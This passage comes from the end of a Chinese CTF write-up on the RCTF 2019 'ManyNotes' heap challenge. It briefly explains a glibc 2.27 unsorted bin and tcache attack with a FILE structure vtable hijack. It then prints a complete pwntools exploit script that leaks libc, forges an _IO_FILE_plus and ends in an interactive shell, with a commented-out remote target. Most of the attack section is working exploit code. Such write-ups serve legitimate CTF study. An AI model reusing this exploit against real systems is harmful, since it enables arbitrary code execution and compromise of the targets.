<p>使得最后_int_free (av, old_top, 1)<br>很明显MINSIZE + nb - old_size&lt;0不能构造，不然会直接从top chunk分割出去一块chunk<br>只能想办法grow_heap失败，很明显，直接分配很多堆，耗尽第一次mmap的空间，让高地址无法直接扩充分割即可<br>由此获得了free的机会<br>下面我选择构造两次这样的机会，一次free进unsorted bin，一次进入tcache bin，unsortbin下即可利用unsorted bin分割的特点，利用read时的溢出改写剩下的unsorted chunk来进行unsorted bin attack，将地址写到tcache的fd位置(只改unsorted chunk的bk低位即可)，奇怪的是此时会写入&amp;av-&gt;top chunk,不过av-&gt;top chunk位置依然可控，我们在开始的name处leak libc，将fd再次指向一个位置，即可任意地址写，这时候改写IO_FILE或者malloc_hook都可以完成利用，这里主要是unsorted bin attack时改写unsorted chunk的bk低位地址时，有一位其实不可控，所以要爆破1 byte，本地ubuntu 18.04(libc-2.27)很快即可get shell，不过远程过程中这一步始终无法爆出，猜测应该是新线程堆地址偏移在libc-2.26和libc-2.27环境下低字节有区别或者像babyheap因为中间远程传输过长数据会出玄学等原因，理论上libc-2.26和libc-2.27分配机制相同，直接改libc偏移即可，这里不清楚具体原因，EXP是我在libc-2.27下成功本地利用的脚本</p>
<h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">_IO_USE_OLD_IO_FILE = <span class="literal">False</span></span><br><span class="line">_BITS = <span class="number">64</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_u64</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.unpack(<span class="string">"&lt;Q"</span>,data)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_u32</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.unpack(<span class="string">"&lt;I"</span>,data)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_u16</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.unpack(<span class="string">"&lt;H"</span>,data)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_u8</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> ord(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_usz</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> _BITS == <span class="number">32</span>:</span><br><span class="line">        <span class="keyword">return</span> _u32(data)</span><br><span class="line">    <span class="keyword">elif</span> _BITS == <span class="number">64</span>:</span><br><span class="line">        <span class="keyword">return</span> _u64(data)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"[-] Invalid _BITS"</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_ua</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> _BITS == <span class="number">32</span>:</span><br><span class="line">        <span class="keyword">return</span> _u32(data)</span><br><span class="line">    <span class="keyword">elif</span> _BITS == <span class="number">64</span>:</span><br><span class="line">        <span class="keyword">return</span> _u64(data)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"[-] Invalid _BITS"</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_p64</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">"&lt;Q"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_p32</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">"&lt;I"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_p16</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">"&lt;H"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_p8</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> chr(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_psz</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> _BITS == <span class="number">32</span>:</span><br><span class="line">        <span class="keyword">return</span> _p32(data)</span><br><span class="line">    <span class="keyword">elif</span> _BITS == <span class="number">64</span>:</span><br><span class="line">        <span class="keyword">return</span> _p64(data)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"[-] Invalid _BITS"</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_pa</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> _BITS == <span class="number">32</span>:</span><br><span class="line">        <span class="keyword">return</span> struct.pack(<span class="string">"&lt;I"</span>, data)</span><br><span class="line">    <span class="keyword">elif</span> _BITS == <span class="number">64</span>:</span><br><span class="line">        <span class="keyword">return</span> struct.pack(<span class="string">"&lt;Q"</span>, data)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"[-] Invalid _BITS"</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">_IO_FILE_plus</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self._flags = <span class="number">0xfbad2800</span>      <span class="comment"># High-order word is _IO_MAGIC; rest is flags.</span></span><br><span class="line">        self._IO_read_ptr = libc_addr<span class="number">-0x7ffff6e03000</span>+<span class="number">0x7ffff71ef7e3</span>   <span class="comment"># Current read pointer</span></span><br><span class="line">        self._IO_read_end = libc_addr<span class="number">-0x7ffff6e03000</span>+<span class="number">0x7ffff71ef7e3</span><span class="comment"># End of get area</span></span><br><span class="line">        self._IO_read_base = libc_addr<span class="number">-0x7ffff6e03000</span>+<span class="number">0x7ffff71ef7e3</span>  <span class="comment"># Start of putback+get area</span></span><br><span class="line">        self._IO_write_base =libc_addr<span class="number">-0x7ffff6e03000</span>+<span class="number">0x7ffff71ef7e3</span> <span class="comment"># Start of put area</span></span><br><span class="line">        self._IO_write_ptr = libc_addr<span class="number">-0x7ffff6e03000</span>+<span class="number">0x7ffff71ef7e3</span>  <span class="comment"># Current put pointer</span></span><br><span class="line">        self._IO_write_end = libc_addr<span class="number">-0x7ffff6e03000</span>+<span class="number">0x7ffff71ef7e3</span>  <span class="comment"># End of put area</span></span><br><span class="line">        self._IO_buf_base = bin_sh_addr   <span class="comment"># Start of reserve area</span></span><br><span class="line">        self._IO_buf_end = libc_addr<span class="number">-0x7ffff6e03000</span>+<span class="number">0x7ffff71ef7e3</span>+<span class="number">1</span>   <span class="comment"># End of reserve area</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># The following fields are used to support backing up and undo.</span></span><br><span class="line">        self._IO_save_base = <span class="number">0</span>      <span class="comment"># Pointer to start of non-current get area</span></span><br><span class="line">        self._IO_backup_base = <span class="number">0</span>    <span class="comment"># Pointer to first valid character of backup area</span></span><br><span class="line">        self._IO_save_end = <span class="number">0</span>       <span class="comment"># Pointer to end of non-current get area</span></span><br><span class="line"></span><br><span class="line">        self._markers = <span class="number">0</span></span><br><span class="line">        self._chain = libc_addr<span class="number">-0x7ffff6e03000</span>+<span class="number">0x7ffff71eea00</span></span><br><span class="line"></span><br><span class="line">        self._fileno = <span class="number">1</span></span><br><span class="line">        self._flags2 = <span class="number">0</span></span><br><span class="line">        self._old_offset = <span class="number">0xffffffffffffffff</span>    <span class="comment"># This used to be _offset but it's too small</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 1+column number of pbase(); 0 is unknown</span></span><br><span class="line">        self._cur_column = <span class="number">0</span></span><br><span class="line">        self._vtable_offset = <span class="number">0</span></span><br><span class="line">        self._shortbuf = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        self._lock = libc_addr<span class="number">-0x7ffff6e03000</span>+<span class="number">0x7ffff71f08c0</span> </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> _IO_USE_OLD_IO_FILE:</span><br><span class="line">            self._offset = <span class="number">0xffffffffffffffff</span></span><br><span class="line">            self._codecvt = <span class="number">0</span></span><br><span class="line">            self._wide_data =libc_addr<span class="number">-0x7ffff6e03000</span>+<span class="number">0x7ffff71ee8c0</span></span><br><span class="line">            self._freeres_list = <span class="number">0</span></span><br><span class="line">            self._freeres_buf = <span class="number">0</span></span><br><span class="line">            self.__pad5 = <span class="number">0</span></span><br><span class="line">            self._mode = <span class="number">0xffffffff</span></span><br><span class="line">            self._unused2 = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">15</span> * <span class="number">4</span> - <span class="number">5</span> * _BITS / <span class="number">8</span>)]</span><br><span class="line">        self.vtable = libc_addr+<span class="number">0x3e7fa0</span><span class="number">-0x28</span> <span class="comment">#_IO_strn_jumps-&gt;_IO_str_finish</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tostr</span><span class="params">(self)</span>:</span></span><br><span class="line">        buf = _p64(self._flags &amp; <span class="number">0xffffffff</span>) + \</span><br><span class="line">            _pa(self._IO_read_ptr) + \</span><br><span class="line">            _pa(self._IO_read_end) + \</span><br><span class="line">            _pa(self._IO_read_base) + \</span><br><span class="line">            _pa(self._IO_write_base) + \</span><br><span class="line">            _pa(self._IO_write_ptr) + \</span><br><span class="line">            _pa(self._IO_write_end) + \</span><br><span class="line">            _pa(self._IO_buf_base) + \</span><br><span class="line">            _pa(self._IO_buf_end) + \</span><br><span class="line">            _pa(self._IO_save_base) + \</span><br><span class="line">            _pa(self._IO_backup_base) + \</span><br><span class="line">            _pa(self._IO_save_end) + \</span><br><span class="line">            _pa(self._markers) + \</span><br><span class="line">            _pa(self._chain) + \</span><br><span class="line">            _p32(self._fileno) + \</span><br><span class="line">            _p32(self._flags2) + \</span><br><span class="line">            _p64(self._old_offset) + \</span><br><span class="line">            _p16(self._cur_column) + \</span><br><span class="line">            _p8(self._vtable_offset) + \</span><br><span class="line">            _p8(self._shortbuf)</span><br><span class="line">        <span class="keyword">if</span> _BITS == <span class="number">64</span>:</span><br><span class="line">            buf += _p32(<span class="number">0</span>)</span><br><span class="line">        buf += _pa(self._lock)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> _IO_USE_OLD_IO_FILE:</span><br><span class="line">            buf += \</span><br><span class="line">            _p64(self._offset) + \</span><br><span class="line">            _pa(self._codecvt) + \</span><br><span class="line">            _pa(self._wide_data) + \</span><br><span class="line">            _pa(self._freeres_list) + \</span><br><span class="line">            _pa(self._freeres_buf) + \</span><br><span class="line">            _psz(self.__pad5) + \</span><br><span class="line">            _p32(self._mode) + \</span><br><span class="line">            <span class="string">''</span>.join(map(<span class="keyword">lambda</span> x:_p8(x), self._unused2)) +\</span><br><span class="line">            _pa(self.vtable)</span><br><span class="line">        <span class="keyword">return</span> buf</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.tostr()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,pad,io_put=<span class="number">1</span>)</span>:</span></span><br><span class="line">   p.sendlineafter(<span class="string">"Choice: "</span>,<span class="string">"0"</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">"Size: "</span>,str(size))</span><br><span class="line">   p.sendlineafter(<span class="string">"Padding: "</span>,str(pad))</span><br><span class="line">   p.sendlineafter(<span class="string">"Input? (0/1): "</span>,str(io_put))</span><br><span class="line">   <span class="keyword">if</span> io_put==<span class="number">1</span>:</span><br><span class="line">      p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">      p.send(<span class="string">"a"</span>*size)</span><br><span class="line"><span class="keyword">for</span> z <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">   <span class="keyword">try</span>:</span><br><span class="line">      p=process(<span class="string">"./many_notes"</span>)</span><br><span class="line">      <span class="comment">#p=remote("127.0.0.1",9999)</span></span><br><span class="line">      <span class="comment">#p=remote("123.206.174.203",20003)</span></span><br><span class="line">      <span class="comment">#leak libc</span></span><br><span class="line">      p.recvuntil(<span class="string">"name: \n"</span>)</span><br><span class="line">      p.send(<span class="string">"aaaaaaaa"</span>)</span><br><span class="line">      p.recvuntil(<span class="string">"a"</span>*<span class="number">8</span>)</span><br><span class="line">      libc_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))<span class="number">-0x3ec760</span><span class="comment">#-0x3ab720#</span></span><br><span class="line">      <span class="keyword">print</span> hex(libc_addr)</span><br><span class="line">      IO_stdout=libc_addr+<span class="number">0x3ec758</span><span class="comment">#+0x3ebc30#+0x03aac10#</span></span><br><span class="line">      bin_sh_addr=libc_addr+<span class="number">0x1b3e9a</span></span><br><span class="line">      <span class="comment">#get fake unsorted</span></span><br><span class="line">      <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        add(<span class="number">0x1ff8</span>,<span class="number">0x400</span>,<span class="number">0</span>)</span><br><span class="line">      add(<span class="number">0x1ff8</span>,<span class="number">1015</span>,<span class="number">0</span>)</span><br><span class="line">      add(<span class="number">0x3b0</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">      <span class="comment">#gdb.attach(p)</span></span><br><span class="line">      <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        add(<span class="number">0x1ff8</span>,<span class="number">0x400</span>,<span class="number">0</span>)</span><br><span class="line">      add(<span class="number">0x1ff8</span>,<span class="number">1015</span>,<span class="number">0</span>)</span><br><span class="line">      p.sendlineafter(<span class="string">"Choice: "</span>,<span class="string">"0"</span>)</span><br><span class="line">      p.sendlineafter(<span class="string">"Size: "</span>,str(<span class="number">0x1ff8</span>))</span><br><span class="line">      p.sendlineafter(<span class="string">"Padding: "</span>,str(<span class="number">0</span>))</span><br><span class="line">      p.sendlineafter(<span class="string">"Input? (0/1): "</span>,str(<span class="number">1</span>))</span><br><span class="line">      p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">      p.send(<span class="string">"a"</span>*<span class="number">0x1ff0</span>+p64(IO_stdout))</span><br><span class="line">      <span class="comment">#do magic</span></span><br><span class="line">      p.sendlineafter(<span class="string">"Choice: "</span>,<span class="string">"0"</span>)</span><br><span class="line">      p.sendlineafter(<span class="string">"Size: "</span>,str(<span class="number">0xf8</span>))</span><br><span class="line">      p.sendlineafter(<span class="string">"Padding: "</span>,str(<span class="number">0</span>))</span><br><span class="line">      p.sendlineafter(<span class="string">"Input? (0/1): "</span>,str(<span class="number">1</span>))</span><br><span class="line">      p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">      p.sendline(<span class="string">"a"</span>*<span class="number">239</span>)</span><br><span class="line">      p.send(p64(IO_stdout)+p64(<span class="number">0xec1</span>)+<span class="string">"a"</span>*<span class="number">8</span>+<span class="string">"\xd0\xee\xff\xff"</span>)</span><br><span class="line">      <span class="comment">#gdb.attach(p)</span></span><br><span class="line">      p.sendlineafter(<span class="string">"Choice: "</span>,<span class="string">"0"</span>)</span><br><span class="line">      p.sendlineafter(<span class="string">"Size: "</span>,str(<span class="number">0xeb8</span>))</span><br><span class="line">      p.sendlineafter(<span class="string">"Padding: "</span>,str(<span class="number">0</span>))</span><br><span class="line">      p.sendlineafter(<span class="string">"Input? (0/1): "</span>,str(<span class="number">0</span>))</span><br><span class="line">      add(<span class="number">0x108</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">      add(<span class="number">0x108</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">      add(<span class="number">0x108</span>,<span class="number">0</span>)</span><br><span class="line">      p.sendlineafter(<span class="string">"Choice: "</span>,<span class="string">"0"</span>)</span><br><span class="line">      p.sendlineafter(<span class="string">"Size: "</span>,str(<span class="number">0x108</span>))</span><br><span class="line">      p.sendlineafter(<span class="string">"Padding: "</span>,str(<span class="number">0</span>))</span><br><span class="line">      p.sendlineafter(<span class="string">"Input? (0/1): "</span>,str(<span class="number">1</span>))</span><br><span class="line">      p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">      one_target=libc_addr+<span class="number">0x4f2c5</span><span class="comment">#+0x40e86#</span></span><br><span class="line">      payload=_IO_FILE_plus().tostr()+p64(<span class="number">0</span>)+p64(libc_addr+<span class="number">0x4f440</span>)+p64(IO_stdout)</span><br><span class="line">      p.send(payload+<span class="string">"\x00"</span>*(<span class="number">0x108</span>-len(payload)))</span><br><span class="line">      <span class="comment">#gdb.attach(p)</span></span><br><span class="line">      p.interactive()</span><br><span class="line">   <span class="keyword">except</span>:</span><br><span class="line">      <span class="keyword">print</span> str(z)+<span class="string">"  failed"</span></span><br></pre></td></tr></table></figure>
  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-babyheap"><span class="toc-number">1.</span> <span class="toc-text">0x01 babyheap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyze"><span class="toc-number">1.1.</span> <span class="toc-text">Analyze</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-number">1.2.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-shellcoder"><span class="toc-number">2.</span> <span class="toc-text">0x02 shellcoder</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyze-1"><span class="toc-number">2.1.</span> <span class="toc-text">Analyze</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-1"><span class="toc-number">2.2.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-ManyNotes"><span class="toc-number">3.</span> <span class="toc-text">0x03 ManyNotes</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyze-2"><span class="toc-number">3.1.</span> <span class="toc-text">Analyze</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-2"><span class="toc-number">3.2.</span> <span class="toc-text">EXP</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/05/20/RCTF-2019-PWN/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/05/20/RCTF-2019-PWN/&text=RCTF 2019 PWN" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/05/20/RCTF-2019-PWN/&title=RCTF 2019 PWN" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/05/20/RCTF-2019-PWN/&is_video=false&description=RCTF 2019 PWN" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=RCTF 2019 PWN&body=Check out this article: http://yoursite.com/2019/05/20/RCTF-2019-PWN/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/05/20/RCTF-2019-PWN/&title=RCTF 2019 PWN" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/05/20/RCTF-2019-PWN/&title=RCTF 2019 PWN" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/05/20/RCTF-2019-PWN/&title=RCTF 2019 PWN" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/05/20/RCTF-2019-PWN/&title=RCTF 2019 PWN" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/05/20/RCTF-2019-PWN/&name=RCTF 2019 PWN&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2020 Kirin
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
</body>
</html>
<!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


<!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


